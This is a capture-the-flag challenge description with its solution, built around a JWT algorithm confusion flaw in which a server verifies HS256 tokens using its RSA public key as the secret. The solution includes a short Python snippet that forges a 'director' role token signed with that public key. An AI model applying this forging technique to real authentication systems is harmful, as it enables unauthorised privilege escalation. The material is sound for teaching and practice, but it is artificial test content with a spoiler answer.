# Challenge 19

## Title
Wanda's Key

## Difficulty
Hard | Points: 300

## Description
S.W.O.R.D.'s director access portal logs were captured following an unauthorised access incident. The portal issues RS256-signed JWTs and exposes its public key. Something about the verification logic let an attacker escalate to Director clearance. Reconstruct how.

## Files
- `verify_logic.py` — reference server-side verification logic
- `public.key` — the exposed RSA public key
- `requests_audit.log` — captured requests with hex-encoded response previews

## Hint
*"It's not like I've been doing this on purpose."* — The vulnerability isn't in the token. It's in which algorithms the server accepts, and what it uses as the secret for each.

## Solution
`verify_logic.py` shows the server accepts both `RS256` and `HS256` — and uses the **same public key** as the secret for HS256 verification. This is the classic JWT algorithm confusion attack.

In the log: a legitimate RS256 token is issued at `/login` (role: `field_operative`, denied at `/verify`). An `alg=none` attempt is rejected. The successful request forges an HS256 token using the contents of `public.key` as the raw HMAC secret, with `role: director`.

```python
import jwt, base64, hmac, hashlib, json
pub_key = open("public.key","rb").read()
header  = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({"role":"director"}).encode()).decode().rstrip('=')
sig = hmac.new(pub_key, f"{header}.{payload}".encode(), hashlib.sha256).digest()
```

Decode that log entry's `RESP_PREVIEW_HEX` to recover the flag.
